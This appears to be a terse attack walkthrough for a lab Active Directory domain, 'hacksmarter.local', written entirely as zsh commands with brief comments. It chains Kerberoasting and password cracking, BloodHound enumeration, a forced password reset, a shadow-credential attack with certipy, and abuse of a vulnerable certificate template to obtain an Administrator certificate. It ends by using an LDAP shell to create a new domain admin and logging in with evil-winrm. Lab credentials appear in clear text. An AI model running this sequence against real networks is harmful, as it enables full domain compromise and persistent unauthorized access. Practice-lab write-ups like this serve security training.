```zsh
impacket-GetUserSPNs -dc-ip 10.1.190.243 hacksmarter.local/faraday
#alt user
impacket-GetUserSPNs -dc-ip 10.1.190.243 hacksmarter.local/faraday -request-user alt.svc
john it #babygirl1

#nothing on initial creds, or alt.svc spray
#bloodhound
bloodhound-ce-python -u 'alt.svc' -p 'babygirl1' -ns 10.1.190.243 --dns-tcp -d hacksmarter.local -c All --zip

#alt.svc -> yorinobu generic all
bloodyAD --host 10.1.190.243 -d hacksmarter.local -u alt.svc -p 'babygirl1' set password 'yorinobu' 'newPassword1!'

#yorinobu -> soulkiller.svc generic write = shadow cred attack certipy
certipy-ad shadow auto -username yorinobu@hacksmarter.local -password 'newPassword1!' -account soulkiller.svc -dc-ip 10.1.190.243
#gives NTLM, john --format=NT 'MYpassword123#'

#no more path, but shadowkiller (and others) were a member of DCOM
certipy-ad find -u 'soulkiller.svc' -p 'MYpassword123#' -dc-ip 10.1.190.243 -stdout -vulnerable
certipy-ad req -u soulkiller.svc -p 'MYpassword123#' -upn Administrator@hacksmarter.local -dc-ip 10.1.190.243 -ca hacksmarter-DC01-CA -template AI_Takeover
certipy-ad auth -pfx administrator.pfx -dc-ip 10.1.190.243
#did not work, had to go the ldaps shell route

certipy-ad req -u soulkiller.svc -p 'MYpassword123#' -upn Administrator@hacksmarter.local -dc-ip 10.1.190.243 -ca hacksmarter-DC01-CA -template AI_Takeover -ldap-simple-auth

certipy-ad auth -pfx administrator_c81050be-c81a-451a-bd3a-8ded7a233379.pfx -dc-ip 10.1.190.243 -ldap-shell
	add_user aj
	add_user_to_group aj "domain admins"
	add_user_to_group aj "remote management users"

evil-winrm -i 10.1.190.243 -u aj -p 'ytf5czwurj4g}k['
```